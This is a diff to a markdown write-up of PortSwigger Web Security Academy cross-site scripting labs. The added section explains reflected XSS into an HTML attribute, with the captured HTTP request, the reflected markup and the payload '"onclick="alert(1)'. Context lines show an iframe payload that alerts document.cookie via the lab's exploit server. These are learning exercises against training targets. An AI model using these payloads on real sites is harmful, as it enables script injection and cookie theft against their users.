@@ -242,9 +242,48 @@ Te: trailers
                         });
                     </script>
 ```
-### Click `Go to exploit server` . Im Body add this 
+### Click `Go to exploit server` . In Body add this 
 `<iframe src="https://your-lab-id.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=alert(document.cookie)>'"</iframe>`
 ### Then click `Store` , and then `View exploit` .
 ### This will make a new image source with our lab id , and it will show our home page of lab. Now click `Deliver exploit to victim` to solve lab.
 
 
+# Lab7: Reflected XSS into attribute with angle brackets HTML-encoded
+
+### After sending found a vulnerability of `value` .
+**Request**
+```http
+GET /?search=hello123 HTTP/2
+Host: 0a0500a703762633813f202b00fa00a5.web-security-academy.net
+Cookie: session=REDACTED
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a0500a703762633813f202b00fa00a5.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+```
+
+### Our search is going into a variable `value` .
+```http
+                   <section class=search>
+                        <form action=/ method=GET>
+                            <input type=text placeholder='Search the blog...' name=search value="hello123">
+```
+### Now we need to send a payload to another variable so that it works , I tested by searching `"hello123` , saw the response stores by ending the `value` , started a new variable with a `=` .So if I try to block the whole line with `>` and run `<script>alert(1)</script>` , it'll not work as it will not be valid HTML form containing no value and variable in `=` and it's getting URL encoded after sending request .
+```http
+<input type="text" placeholder="Search the blog..." name="search" value="" hello123"="">
+```
+
+### Now I tested with input `"hello="123` , now it's a valid HTML form .Now I have to give a payload which contains value defining parameter .
+```http
+<input type="text" placeholder="Search the blog..." name="search" value="" hello="123">
+```
+
+### Ran this payload , `"onclick="alert(1)` ,when clicking the searchbox ,it's executing and giving alert .
